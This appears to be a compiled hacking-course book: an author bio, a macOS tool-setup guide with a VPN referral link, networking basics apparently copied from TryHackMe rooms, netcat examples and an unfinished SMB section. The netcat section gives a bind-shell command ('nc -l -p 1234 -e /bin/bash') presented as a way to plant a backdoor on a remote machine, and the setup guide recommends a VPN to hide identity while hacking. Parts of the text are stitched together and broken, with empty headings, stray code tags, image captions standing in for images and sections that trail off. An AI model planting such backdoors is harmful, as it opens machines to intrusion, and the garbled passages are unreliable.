<p>Szymon Bronisław Błaszczyński is a software engineer with a passion for programming and teaching. He has been working in the IT industry for over 10 years. He is a big fan of Python and Django. He is also, a good
joker, because that's not him. His passion is music, he likes to write,
used to write on walls (don't do this!), he does not remember how to use
simple functions, or to properly open a file in any language, so
he use a lot of AI - it is a miracle that he can write this text. He is
a big fan of Rust, but he started with Go, in programming since his 10th,
and when asked what he can program, he says &quot;I can write a program that is
an infinite loop.&quot; To earn his associate degree in IT, he had to break into
Windows 7, and he did it. He is a big fan of Linux, but he uses Windows10 -
again, good, joke AI - he hates Linus Torvalds for not admitting he's an
inventor of Git, and that Windows is better than Linux (well, it's not,
but mr. Linus is not the GNU Linux environment, without which, there would
be no need, for a fight if kernel could be written in Rust). I'm still
amazed by blazingly fast macOS, love my iPhone and full of high tones.</p>

<p><em>Nutek Security Platform</em> in form of <code>nutek-apple.rb</code>. This Ruby program lets
you download everything you will need to hack &amp; slash.</p>
<p><a href="https://github.com/nutek-terminal/nutek-apple">Look Here!</a> and start with
<code>mini</code> version.</p>
<p>I have compiled this program sets to replace paid or trial based
applications, so the cost is nil. The only thing involved is computer
and internet connection.</p>
<h2 id="get-yourself-good-terminal-application"><a class="header" href="#get-yourself-good-terminal-application">Get yourself good terminal application</a></h2>
<p>I recommend <a href="https://iterm2.com/">iTerm2</a>. It is free and has a lot of
features. You can use default Terminal.app, but it is not as good as
iTerm2.</p>
<p>Actually above statement is not true. I recommend either <a href="https://alacritty.org/">Alacritty</a> or <a href="https://sw.kovidgoyal.net/kitty/">Kitty</a>. Both are free 
and have a lot of features. You can use also <a href="https://www.warp.dev/">Warp</a> 
it's the most advanced terminal emulator for Mac. The difference between 
this termianl apps and iTerm2 is that they are using GPU to render the 
terminal. This means that they are faster and more responsive.</p>
<h2 id="get-yourself-good-text-editor"><a class="header" href="#get-yourself-good-text-editor">Get yourself good text editor</a></h2>
<p>I recommend <a href="https://code.visualstudio.com/">Visual Studio Code</a>. It is
free and has a lot of features. You can use default TextEdit.app, but
it is not as good as VSCode.</p>
<p>You can also use <a href="https://neovim.io/">Neovim</a>, but it's not for everyone. 
It's a bit more complicated to use, but it's very powerful. You can use it with
<a href="https://alacritty.org/">Alacritty</a> or <a href="https://sw.kovidgoyal.net/kitty/">Kitty</a>.
It also works with <a href="https://www.warp.dev/">Warp</a> and <a href="https://iterm2.com/">iTerm2</a>, Terminal.app also is capable of running Neovim. The difference between 
VS Code and Neovim is that Neovim is a terminal based text editor. This means 
that one you can use in the terminal and the other you can use in the GUI (normal system window). It's also 
very fast and responsive.</p>
<p>Right now the new upcoming text editor is <a href="https://zed.dev/">Zed</a>. It's made in Rust and it's very fast and responsive. It's also very powerful. It's also free and open source.</p>
<h2 id="get-yourself-good-browser"><a class="header" href="#get-yourself-good-browser">Get yourself good browser</a></h2>
<p>I recommend <a href="https://www.mozilla.org/en-US/firefox/new/">Firefox</a>. It is
free and has a lot of features. You can use default Safari.app, but it
is not as good as Firefox. Esspecially when it comes to security.
It's not that Safari is not secure, Firefox let's you install individual
SSL certificates that do not interfere with the system. This is very
important when you are testing SSL/TLS connections.</p>
<p>The second browser I recommend is <a href="https://www.opera.com/gx">Opera GX</a>.
It's a gaming browser, but it's also very good for hacking. It has a lot
of features like <em>free</em> VPN, ad blocker, etc. It's also very fast and secure.</p>
<h2 id="invest-into-good-vpn"><a class="header" href="#invest-into-good-vpn">Invest into good VPN</a></h2>
<p>I recommend <a href="https://www.expressrefer.com/refer-a-friend/30-days-free?referrer_id=92684050&amp;utm_campaign=referrals&amp;utm_medium=copy_link&amp;utm_source=referral_dashboard">ExpressVPN</a>. It is not free, but
it is very good. You can use free version, but it is limited to 3
countries and 1 device. You can use default VPN.app, but it is not
as good as ExpressVPN. With this VPN you can connect to 160 locations
in 94 countries. It's very fast and secure. It also has a lot of
features like split tunneling, kill switch, DNS leak protection,
etc. It's also very easy to use. You can use it on all your devices
and you can use it on all your devices at the same time. It's also
very cheap. It's only $8.32-13 per month. You can also use it for free
for 30 days.</p>
<p>It's <strong>important to use VPN</strong> when you are hacking. Because, you might be locked
when doing your security assessment. You can also use VPN to hide your
identity. <strong>Don't tell me that I didn't warn you</strong>.</p>
<h2 id="what-i-use"><a class="header" href="#what-i-use">What I use?</a></h2>
<ul>
<li>nutek-apple.rb (Ruby script) <em>mini</em> version</li>
<li>Alacritty (Terminal) - in nutek-apple.rb
<ul>
<li>tmux (Terminal Multiplexer) - in nutek-apple.rb
<ul>
<li>tmux mouse support - <code>echo &quot;set -g mouse on&quot; &gt;&gt; ~/.tmux.conf</code></li>
</ul>
</li>
</ul>
</li>
<li>Warp (Terminal) - in nutek-apple.rb</li>
<li>Neovim (Text Editor) - Vim is included in macOS as default
<ul>
<li>Coc (Vim Plugin)</li>
<li>Vim Plug (Vim Plugin Manager)</li>
</ul>
</li>
<li>Firefox (Browser) - in nutek-apple.rb</li>
<li>Opera GX (Browser) - web browser that has a lot of features (Spotify, Messanger, WhatsApp, X, etc.)</li>
<li>Homebrew (Package Manager) - in nutek-apple.rb</li>
<li>ExpressVPN (VPN)</li>
<li>VS Code (Text Editor)</li>
<li>Python3 (Programming Language) - default in macOS, recommended to use
pyenv and pyenv-virtualenv to install newer version, use with matplotlib, numpy, pandas, sympy and jupyter for data science</li>
<li>Ruby (Programming Language) - default in macOS, recommended to use rbenv
to install newer version, use with rails, sinatra, jekyll, etc.</li>
<li>Rust (Programming Language), recommended to use rustup to install and use it to create CLI tools for example</li>
<li>Go (Programming Language), recommended to use goenv to install and use it to create CLI tools for example</li>
<li>One of the below:
<ul>
<li>Podman (Container Engine) - in nutek-apple.rb
<ul>
<li>Podman Desktop (GUI for Podman) - in nutek-apple.rb</li>
</ul>
</li>
<li>Docker (Container Engine) - in nutek-apple.rb</li>
</ul>
</li>
<li>Trello (Project Management) - AppStore</li>
<li>Bard, ChatGPT and GitHub Copilot (AI) - <strong>think</strong> before you enter anything into the prompt engine, don't let the data leak out, your data is your data, don't let anyone use it against you and others.</li>
<li>JavaScript programming language prefferably installed using nvm (Node.js) - to build upon read materials and probably make webapps, D3.js, etc.</li>
<li>Wireshark (Network Analyzer) - in nutek-apple.rb</li>
</ul>
<p>I think you catched the drift. I use everything that is in nutek-apple.rb.
I also use mostly open source software. I also use some paid software,
but I think it's worth it. I also use some software that is not in
nutek-apple.rb.</p>
<h2 id="what-kind-of-device-you-will-need"><a class="header" href="#what-kind-of-device-you-will-need">What kind of device you will need?</a></h2>
<p>I recommend any macOS device that is capable of running macOS Big Sur. Although
above setup might work on older versions of macOS, but it's not tested.</p>
<p>You might use this setup on Linux, but it's not tested, and you will have to
manually tweak nutek-apple.rb to work with Linux. The rest of the setup should
work on Linux.</p>
<p>Windows is not supported. You can use Windows Subsystem for Linux, but it's not
tested. You will have to manually tweak nutek-apple.rb to work with Windows
Subsystem for Linux. The rest of the setup should work on Windows Subsystem for
Linux. You can also use Windows Terminal, but it's not tested. You will have to
manually tweak nutek-apple.rb to work with Windows Terminal. The rest of the
setup should work on Windows Terminal and Windows Desktop (10/11). You could
also use virtual machine with some flavour of Linux, but it's not tested. 
You will have to manually tweak nutek-apple.rb to work with virtual machine.
The rest of the setup should work on virtual machine, except for Podman, 
which might be tricky or impossible to run on virtual machine depending on
capabilities of your CPU.</p>
<p>You might also try <a href="https://github.com/nutek-terminal/nutek-fedsec">nutek-fedsec on GitHub</a> and
<a href="https://hub.docker.com/r/neosb/nutek-fedsec">nutek-fedsec on Dockerhub</a> 
insted of nutek-apple.rb. This is few GigaBytes Docker image powered by
Fedora that contains everything you will need to hack &amp; slash, but it's not 
any more developed. It's open source, so you can fork it and develop it 
yourself. It's also free, so you can use it as you like.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basics-of-networking"><a class="header" href="#basics-of-networking">Basics of networking</a></h1>
<p><strong>Basic networking concepts:</strong></p>
<ul>
<li><strong>IP address:</strong> An IP address is a unique identifier that is assigned to each device on a network. IP addresses are used to route traffic between devices on the network.</li>
<li><strong>Subnet mask:</strong> A subnet mask is used to divide a network into smaller subnetworks. Subnetworks are useful for organizing and managing networks.</li>
<li><strong>Gateway:</strong> A gateway is a device that connects two networks together. Gateways are used to route traffic between networks.</li>
<li><strong>Router:</strong> A router is a device that forwards traffic between networks. Routers use routing tables to determine the best path to forward traffic.</li>
<li><strong>Switch:</strong> A switch is a device that connects devices on a network together. Switches allow devices to communicate with each other without having to go through a central device, such as a router.</li>
</ul>
<p><strong>Types of networks:</strong></p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="osi-model-1"><a class="header" href="#osi-model-1">OSI model</a></h1>
<p>The OSI (Open Systems Interconnection) Model is a standardised model which we use to demonstrate the theory behind computer networking. In practice, it's actually the more compact TCP/IP model that real-world networking is based off; however the OSI model, in many ways, is easier to get an initial understanding from.</p>
<p>The OSI model consists of seven layers:</p>
<p>Table showing the OSI layers: Application, Presentation, Session, Transport, Network, Data Link, Physical</p>
<p>There are many mnemonics floating around to help you learn the layers of the OSI model -- search around until you find one that you like.</p>
<p>I personally favour: Anxious Pale Shakespeare Treated Nervous Drunks Patiently</p>
<p>Let's briefly take a look at each of these in turn:</p>
<p>Layer 7 -- Application:</p>
<p>The application layer of the OSI model essentially provides networking options to programs running on a computer. It works almost exclusively with applications, providing an interface for them to use in order to transmit data. When data is given to the application layer, it is passed down into the presentation layer.</p>
<p>Layer 6 -- Presentation:</p>
<p>The presentation layer receives data from the application layer. This data tends to be in a format that the application understands, but it's not necessarily in a standardised format that could be understood by the application layer in the receiving computer. The presentation layer translates the data into a standardised format, as well as handling any encryption, compression or other transformations to the data. With this complete, the data is passed down to the session layer.</p>
<p>Layer 5 -- Session:</p>
<p>When the session layer receives the correctly formatted data from the presentation layer, it looks to see if it can set up a connection with the other computer across the network. If it can't then it sends back an error and the process goes no further. If a session can be established then it's the job of the session layer to maintain it, as well as co-operate with the session layer of the remote computer in order to synchronise communications. The session layer is particularly important as the session that it creates is unique to the communication in question. This is what allows you to make multiple requests to different endpoints simultaneously without all the data getting mixed up (think about opening two tabs in a web browser at the same time)! When the session layer has successfully logged a connection between the host and remote computer the data is passed down to Layer 4: the transport Layer.</p>
<p>Layer 4 -- Transport:</p>
<p>The transport layer is a very interesting layer that serves numerous important functions. Its first purpose is to choose the protocol over which the data is to be transmitted. The two most common protocols in the transport layer are TCP (Transmission Control Protocol) and UDP (User Datagram Protocol); with TCP the transmission is connection-based which means that a connection between the computers is established and maintained for the duration of the request. This allows for a reliable transmission, as the connection can be used to ensure that the packets all get to the right place. A TCP connection allows the two computers to remain in constant communication to ensure that the data is sent at an acceptable speed, and that any lost data is re-sent. With UDP, the opposite is true; packets of data are essentially thrown at the receiving computer -- if it can't keep up then that's its problem (this is why a video transmission over something like Skype can be pixelated if the connection is bad). What this means is that TCP would usually be chosen for situations where accuracy is favoured over speed (e.g. file transfer, or loading a webpage), and UDP would be used in situations where speed is more important (e.g. video streaming).</p>
<p>With a protocol selected, the transport layer then divides the transmission up into bite-sized pieces (over TCP these are called segments, over UDP they're called datagrams), which makes it easier to transmit the message successfully. </p>
<p>Layer 3 -- Network:</p>
<p>The network layer is responsible for locating the destination of your request. For example, the Internet is a huge network; when you want to request information from a webpage, it's the network layer that takes the IP address for the page and figures out the best route to take. At this stage we're working with what is referred to as Logical addressing (i.e. IP addresses) which are still software controlled. Logical addresses are used to provide order to networks, categorising them and allowing us to properly sort them. Currently the most common form of logical addressing is the IPV4 format, which you'll likely already be familiar with (i.e 192.168.1.1 is a common address for a home router).</p>
<p>Layer 2 -- Data Link:</p>
<p>The data link layer focuses on the physical addressing of the transmission. It receives a packet from the network layer (that includes the IP address for the remote computer) and adds in the physical (MAC) address of the receiving endpoint. Inside every network enabled computer is a Network Interface Card (NIC) which comes with a unique MAC (Media Access Control) address to identify it.</p>
<p>MAC addresses are set by the manufacturer and literally burnt into the card; they can't be changed -- although they can be spoofed. When information is sent across a network, it's actually the physical address that is used to identify where exactly to send the information.</p>
<p>Additionally, it's also the job of the data link layer to present the data in a format suitable for transmission.</p>
<p>The data link layer also serves an important function when it receives data, as it checks the received information to make sure that it hasn't been corrupted during transmission, which could well happen when the data is transmitted by layer 1: the physical layer.</p>
<p>Layer 1 -- Physical:</p>
<p>The physical layer is right down to the hardware of the computer. This is where the electrical pulses that make up data transfer over a network are sent and received. It's the job of the physical layer to convert the binary data of the transmission into signals and transmit them across the network, as well as receiving incoming signals and converting them back into binary data.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tcpip-model-1"><a class="header" href="#tcpip-model-1">TCP/IP model</a></h1>
<p>The TCP/IP model is, in many ways, very similar to the OSI model. It's a few years older, and serves as the basis for real-world networking. The TCP/IP model consists of four layers: Application, Transport, Internet and Network Interface. Between them, these cover the same range of functions as the seven layers of the OSI Model.</p>
<p>The layesrs of the TCP/IP model: Application, Transport,Internet, Network Interface</p>
<p>Note: Some recent sources split the TCP/IP model into five layers -- breaking the Network Interface layer into Data Link and Physical layers (as with the OSI model). This is accepted and well-known; however, it is not officially defined (unlike the original four layers which are defined in RFC1122). It's up to you which version you use -- both are generally considered valid.</p>
<p>You would be justified in asking why we bother with the OSI model if it's not actually used for anything in the real-world. The answer to that question is quite simply that the OSI model (due to being less condensed and more rigid than the TCP/IP model) tends to be easier for learning the initial theory of networking.</p>
<p>The two models match up something like this:</p>
<p>Comparison between the TCP/IP and OSI models.</p>
<p>The processes of encapsulation and de-encapsulation work in exactly the same way with the TCP/IP model as they do with the OSI model. At each layer of the TCP/IP model a header is added during encapsulation, and removed during de-encapsulation.</p>
<p>Now let's get down to the practical side of things.</p>
<p>A layered model is great as a visual aid -- it shows us the general process of how data can be encapsulated and sent across a network, but how does it actually happen?</p>
<p>When we talk about TCP/IP, it's all well and good to think about a table with four layers in it, but we're actually talking about a suite of protocols -- sets of rules that define how an action is to be carried out. TCP/IP takes its name from the two most important of these: the Transmission Control Protocol (which we touched upon earlier in the OSI model) that controls the flow of data between two endpoints, and the Internet Protocol, which controls how packets are addressed and sent. There are many more protocols that make up the TCP/IP suite; we will cover some of these in later tasks. For now though, let's talk about TCP.</p>
<p>As mentioned earlier, TCP is a connection-based protocol. In other words, before you send any data via TCP, you must first form a stable connection between the two computers. The process of forming this connection is called the three-way handshake.</p>
<p>When you attempt to make a connection, your computer first sends a special request to the remote server indicating that it wants to initialise a connection. This request contains something called a SYN (short for synchronise) bit, which essentially makes first contact in starting the connection process. The server will then respond with a packet containing the SYN bit, as well as another &quot;acknowledgement&quot; bit, called ACK. Finally, your computer will send a packet that contains the ACK bit by itself, confirming that the connection has been setup successfully. With the three-way handshake successfully completed, data can be reliably transmitted between the two computers. Any data that is lost or corrupted on transmission is re-sent, thus leading to a connection which appears to be lossless.</p>
<p>The three way handshake</p>
<p>Frank Syn-acktra -- humour value only</p>
<p>(Credit Kieran Smith, Abertay University)</p>
<p>We're not going to go into exactly how this works on a step-to-step level -- not in this room at any rate. It is sufficient to know that the three-way handshake must be carried out before a connection can be established using TCP.</p>
<p>History:</p>
<p>It's important to understand exactly why the TCP/IP and OSI models were originally created. To begin with there was no standardisation -- different manufacturers followed their own methodologies, and consequently systems made by different manufacturers were completely incompatible when it came to networking. The TCP/IP model was introduced by the American DoD in 1982 to provide a standard -- something for all of the different manufacturers to follow. This sorted out the inconsistency problems. Later the OSI model was also introduced by the International Organisation for Standardisation (ISO); however, it's mainly used as a more comprehensive guide for learning, as the TCP/IP model is still the standard upon which modern networking is based.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="encapsulation-and-decapsulation"><a class="header" href="#encapsulation-and-decapsulation">Encapsulation and decapsulation</a></h1>
<p>As the data is passed down each layer of the model, more information containing details specific to the layer in question is added on to the start of the transmission. As an example, the header added by the Network Layer would include things like the source and destination IP addresses, and the header added by the Transport Layer would include (amongst other things) information specific to the protocol being used. The data link layer also adds a piece on at the end of the transmission, which is used to verify that the data has not been corrupted on transmission; this also has the added bonus of increased security, as the data can't be intercepted and tampered with without breaking the trailer. This whole process is referred to as encapsulation; the process by which data can be sent from one computer to another.</p>
<p>Encapsulation process</p>
<p>Notice that the encapsulated data is given a different name at different steps of the process. In layers 7,6 and 5, the data is simply referred to as data. In the transport layer the encapsulated data is referred to as a segment or a datagram (depending on whether TCP or UDP has been selected as a transmission protocol). At the Network Layer, the data is referred to as a packet. When the packet gets passed down to the Data Link layer it becomes a frame, and by the time it's transmitted across a network the frame has been broken down into bits.</p>
<p>When the message is received by the second computer, it reverses the process -- starting at the physical layer and working up until it reaches the application layer, stripping off the added information as it goes. This is referred to as de-encapsulation. As such you can think of the layers of the OSI model as existing inside every computer with network capabilities. Whilst it's not actually as clear cut in practice, computers all follow the same process of encapsulation to send data and de-encapsulation upon receiving it.</p>
<p>The processes of encapsulation and de-encapsulation are very important -- not least because of their practical use, but also because they give us a standardised method for sending data. This means that all transmissions will consistently follow the same methodology, allowing any network enabled device to send a request to any other reachable device and be sure that it will be understood -- regardless of whether they are from the same manufacturer; use the same operating system; or any other factors.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ping"><a class="header" href="#ping">PING</a></h1>
<p>At this stage, hopefully all of the theory has made sense and you now understand the basic models behind computer networking. For the rest of the room we're going to be taking a look at some of the command line networking tools that we can use in practical applications. Many of these tools do work on other operating systems, but for the sake of simplicity, I'm going to assume that you're running Linux for the rest of this room. The first tool that we're going to look at will be the ping command.</p>
<p>The ping command is used when we want to test whether a connection to a remote resource is possible. Usually this will be a website on the internet, but it could also be for a computer on your home network if you want to check if it's configured correctly. Ping works using the ICMP protocol, which is one of the slightly less well-known TCP/IP protocols that were mentioned earlier. The ICMP protocol works on the Network layer of the OSI Model, and thus the Internet layer of the TCP/IP model. The basic syntax for ping is ping <target>. In this example we are using ping to test whether a network connection to Google is possible:</p>
<p>Pinging Google -- it is possible</p>
<p>Notice that the ping command actually returned the IP address for the Google server that it connected to, rather than the URL that was requested. This is a handy secondary application for ping, as it can be used to determine the IP address of the server hosting a website. One of the big advantages of ping is that it's pretty much ubiquitous to any network enabled device. All operating systems support it out of the box, and even most embedded devices can use ping!</p>
<p>Have a go at the following questions. Any questions about syntax can be answered using the man page for ping (man ping on Linux).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="traceroute"><a class="header" href="#traceroute">Traceroute</a></h1>
<p>The logical follow-up to the ping command is 'traceroute'. Traceroute can be used to map the path your request takes as it heads to the target machine.</p>
<p>The internet is made up of many, many different servers and end-points, all networked up to each other. This means that, in order to get to the content you actually want, you first need to go through a bunch of other servers. Traceroute allows you to see each of these connections -- it allows you to see every intermediate step between your computer and the resource that you requested. The basic syntax for traceroute on Linux is this: traceroute <destination></p>
<p>By default, the Windows traceroute utility (tracert) operates using the same ICMP protocol that ping utilises, and the Unix equivalent operates over UDP. This can be altered with switches in both instances.</p>
<p>Performing a traceroute to Google.com</p>
<p>You can see that it took 13 hops to get from my router (_gateway) to the Google server at 216.58.205.46</p>
<p>Now it's your turn. As with before, all questions about switches can be answered with the man page for traceroute
(man traceroute).</p>

<p>Domain Names -- the unsung saviours of the internet.</p>
<p>Can you imagine how it would feel to remember the IP address of every website you want to visit? Horrible thought.</p>
<p>Fortunately, we've got domains.</p>
<p>We'll talk a little bit more about how this works in the next task, but for now suffice to know that a domain translates into an IP address so that we don't need to remember it (e.g. you can type tryhackme.com, rather than the TryHackMe IP address). Domains are leased out by companies called Domain Registrars. If you want a domain, you go and register with a registrar, then lease the domain for a certain length of time. </p>
<p>Enter Whois.</p>
<p>Whois essentially allows you to query who a domain name is registered to. In Europe personal details are redacted; however, elsewhere you can potentially get a great deal of information from a whois search.</p>
<p>There is a web version of the whois tool if you're particularly averse to the command line. Either way, let's get started!</p>
<p>(Note: You may need to install whois before using it. On Debian based systems this can be done with sudo apt update &amp;&amp; sudo apt-get install whois)</p>
<p>Whois lookups are very easy to perform. Just use whois <domain> to get a list of available information about the domain registration:</p>
<p>Performing a whois lookup on bbc.co.uk</p>
<p>This is comparatively a very small amount of information as can often be found. Notice that we've got the domain name, the company that registered the domain, the last renewal, and when it's next due, and a bunch of information about nameservers (which we'll look at in the next task).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dig"><a class="header" href="#dig">Dig</a></h1>
<p>We talked about domains in the previous task -- now lets talk about how they work.</p>
<p>Ever wondered how a URL gets converted into an IP address that your computer can understand? The answer is a TCP/IP protocol called DNS (Domain Name System).</p>
<p>At the most basic level, DNS allows us to ask a special server to give us the IP address of the website we're trying to access. For example, if we made a request to www.google.com, our computer would first send a request to a special DNS server (which your computer already knows how to find). The server would then go looking for the IP address for Google and send it back to us. Our computer could then send the request to the IP of the Google server.</p>
<p>Let's break this down a bit.</p>
<p>You make a request to a website. The first thing that your computer does is check its local &quot;Hosts File&quot; to see if an explicit IP-&gt;Domain mapping has been created. This is an older system than DNS and much less commonly used in modern environments; however, it still takes precedence in the search order of most operating systems. If no mapping has been manually created, the computer then checks its local DNS cache to see if it already has an IP address stored for the website; if it does, great. If not, it goes to the next stage of the process.</p>
<p>Assuming the address hasn't already been found, your computer will then send a request to what is known as a recursive DNS server. These will automatically be known to the router on your network. Many Internet Service Providers (ISPs) maintain their own recursive servers, but companies such as Google and OpenDNS also control recursive servers. This is how your computer automatically knows where to send the request for information: details for a recursive DNS server are stored in your router or computer. This server will also maintain a cache of results for popular domains; however, if the website you've requested isn't stored in the cache, the recursive server will pass the request on to a root name server.</p>
<p>Before 2004 there were precisely 13 root name DNS servers in the world. These days there are many more; however, they are still accessible using the same 13 IP addresses assigned to the original servers (balanced so that you get the closest server when you make a request). The root name servers essentially keep track of the DNS servers in the next level down, choosing an appropriate one to redirect your request to. These lower level servers are called Top-Level Domain servers.</p>
<p>Top-Level Domain (TLD) servers are split up into extensions. So, for example, if you were searching for tryhackme.com your request would be redirected to a TLD server that handled .com domains. If you were searching for bbc.co.uk your request would be redirected to a TLD server that handles .co.uk domains. As with root name servers, TLD servers keep track of the next level down: Authoritative name servers. When a TLD server receives your request for information, the server passes it down to an appropriate Authoritative name server.</p>
<p>Authoritative name servers are used to store DNS records for domains directly. In other words, every domain in the world will have its DNS records stored on an Authoritative name server somewhere or another; they are the source of the information. When your request reaches the authoritative name server for the domain you're querying, it will send the relevant information back to you, allowing your computer to connect to the IP address behind the domain you requested.</p>
<p>When you visit a website in your web browser this all happens automatically, but we can also do it manually with a tool called dig . Like ping and traceroute, dig should be installed automatically on Linux systems.</p>
<p>Dig allows us to manually query recursive DNS servers of our choice for information about domains:
dig <domain> @<dns-server-ip></p>
<p>It is a very useful tool for network troubleshooting.</p>
<p>Performing a DIG DNS lookup on google.com</p>
<p>This is a lot of information. We're currently most interested in the ANSWER section for this room; however, taking the time to learn what the rest of this means is a very good idea. In summary, that information is telling us that we sent it one query and successfully (i.e. No Errors) received one full answer -- which, as expected, contains the IP address for the domain name that we queried.</p>
<p>Another interesting piece of information that dig gives us is the TTL (Time To Live) of the queried DNS record. As mentioned previously, when your computer queries a domain name, it stores the results in its local cache. The TTL of the record tells your computer when to stop considering the record as being valid -- i.e. when it should request the data again, rather than relying on the cached copy.</p>
<p>The TTL can be found in the second column of the answer section:</p>
<p>Results demonstrating that the TTL of the DNS record is 157</p>
<p>It's important to remember that TTL (in the context of DNS caching) is measured in seconds, so the record in the example will expire in two minutes and thirty-seven seconds.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="netcat"><a class="header" href="#netcat">Netcat</a></h1>
<p>Netcat is a simple Unix utility which reads and writes data across network connections, using the TCP/IP protocol. It is designed to be a reliable &quot;back-end&quot; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.</p>
<h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
<p>Netcat is pre-installed on most Linux distributions. If it is not installed, you can install it using the package manager of your distribution. For example, on Ubuntu, you can install it using the following command:</p>
<pre><code class="language-bash">sudo apt-get install netcat
</code></pre>
<h2 id="usage"><a class="header" href="#usage">Usage</a></h2>
<p>Netcat can be used to read and write data across network connections using the TCP/IP protocol. It can be used for a variety of purposes, such as:</p>
<ul>
<li>Port scanning</li>
<li>Transferring files</li>
<li>Chatting</li>
<li>Port redirection</li>
<li>Port listening</li>
<li>Port forwarding</li>
<li>Banner grabbing</li>
<li>Port knocking</li>

</code></pre>
<p>Here are some examples of how netcat can be used:</p>
<h3 id="chatting"><a class="header" href="#chatting">Chatting</a></h3>
<p>You can use netcat to chat with another user on the same network. For example, to chat with a user on the same network, you can use the following command:</p>
<pre><code class="language-bash">nc -l -p 1234
</code></pre>
<p>This will start netcat in listening mode on port 1234. Then, the other user can connect to your machine using the following command:</p>
<pre><code class="language-bash">nc host 1234
</code></pre>
<h3 id="transferring-files"><a class="header" href="#transferring-files">Transferring files</a></h3>
<p>You can use netcat to transfer files between two machines. For example, to send a file from one machine to another, you can use the following command on the receiving machine:</p>
<pre><code class="language-bash">nc -l -p 1234 &gt; file
</code></pre>
<p>This will start netcat in listening mode on port 1234 and save the incoming data to a file called &quot;file&quot;. Then, on the sending machine, you can use the following command to send the file:</p>
<pre><code class="language-bash">nc host 1234 &lt; file
</code></pre>
<h3 id="port-scanning"><a class="header" href="#port-scanning">Port scanning</a></h3>
<p>You can use netcat to scan for open ports on a remote machine. For example, to scan for open ports on a remote machine, you can use the following command:</p>
<pre><code class="language-bash">nc -z host port
</code></pre>
<p>This will attempt to connect to the specified port on the remote machine. If the connection is successful, netcat will exit with a status of 0, indicating that the port is open. If the connection is unsuccessful, netcat will exit with a status of 1, indicating that the port is closed.</p>
<h3 id="port-listening"><a class="header" href="#port-listening">Port listening</a></h3>
<p>You can use netcat to listen for incoming connections on a specific port. For example, to listen for incoming connections on port 1234, you can use the following command:</p>
<pre><code class="language-bash">nc -l -p 1234
</code></pre>
<p>This will start netcat in listening mode on port 1234. Then, you can use the following command to connect to the listening port:</p>
<pre><code class="language-bash">nc host 1234
</code></pre>
<h3 id="port-forwarding"><a class="header" href="#port-forwarding">Port forwarding</a></h3>
<p>You can use netcat to forward connections from one port to another. For example, to forward connections from port 1234 to port 5678, you can use the following command:</p>
<pre><code class="language-bash">nc -l -p 1234 -c &quot;nc host 5678&quot;
</code></pre>
<p>This will start netcat in listening mode on port 1234 and forward incoming connections to port 5678 on the specified host.</p>
<h3 id="banner-grabbing"><a class="header" href="#banner-grabbing">Banner grabbing</a></h3>
<p>You can use netcat to grab banners from remote machines. For example, to grab the banner from a remote machine, you can use the following command:</p>
<pre><code class="language-bash">nc -v host port
</code></pre>
<p>This will attempt to connect to the specified port on the remote machine and display the banner returned by the server.</p>
<h3 id="port-knocking"><a class="header" href="#port-knocking">Port knocking</a></h3>
<p>You can use netcat to perform port knocking on a remote machine. For example, to perform port knocking on a remote machine, you can use the following command:</p>
<pre><code class="language-bash">nc -z host port1
nc -z host port2
nc -z host port3
</code></pre>
<p>This will attempt to connect to the specified ports on the remote machine in the specified order, effectively &quot;knocking&quot; on the ports to open a specific port or perform a specific action.</p>
<h3 id="backdoor"><a class="header" href="#backdoor">Backdoor</a></h3>
<p>You can use netcat to create a backdoor on a remote machine. For example, to create a backdoor on a remote machine, you can use the following command:</p>
<pre><code class="language-bash">nc -l -p 1234 -e /bin/bash
</code></pre>
<p>This will start netcat in listening mode on port 1234 and execute the specified command when a connection is established.</p>
<p>These are just a few examples of how netcat can be used. There are many other ways to use netcat, and it is a very versatile tool that can be used for a wide variety of purposes.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-smb"><a class="header" href="#basic-smb">Basic SMB</a></h1>
<p>What is SMB?</p>
<p>SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [source]</p>
<p>Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.</p>
<p>The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.</p>
<p>How does SMB work?</p>
<p>Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.</p>
<p>What runs SMB?</p>
<p>Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.</p>
<p>What is Samba?</p>
<p>Samba is a free software re-implementation of the SMB networking protocol, and was originally developed by Andrew Tridgell. Samba provides file and print services for various Microsoft Windows clients and can integrate with a Windows Server domain, either as a Domain Controller (DC) or as a domain member. As of version 4, it supports Active Directory and Microsoft Windows NT domains.</p>
<p>Samba runs on most Unix and Unix-like systems, such as Linux, Solaris, AIX and the BSD variants, including Apple's macOS Server, and OS/2.</p>
<p>Samba is standard on nearly all distributions of Linux and is commonly included as a basic system service on other Unix-based operating systems as well. Samba is released under the terms of the GNU General Public License. The name Samba comes from SMB (Server Message Block), the name of the standard protocol used by the Microsoft Windows network file system.</p>
<p>What is the difference between SMB and CIFS?</p>
<p>CIFS (Common Internet File System) is a dialect of SMB. Both SMB and CIFS are also available on VMS, several versions of Unix, and other operating systems. CIFS is a public or open variation of the Server Message Block Protocol (SMB) developed and used by Microsoft, and it uses the TCP/IP protocol. The term CIFS does not refer to a single protocol, but to a family of protocols, including the following:</p>

<p>What is the difference between SMB and NFS?</p>
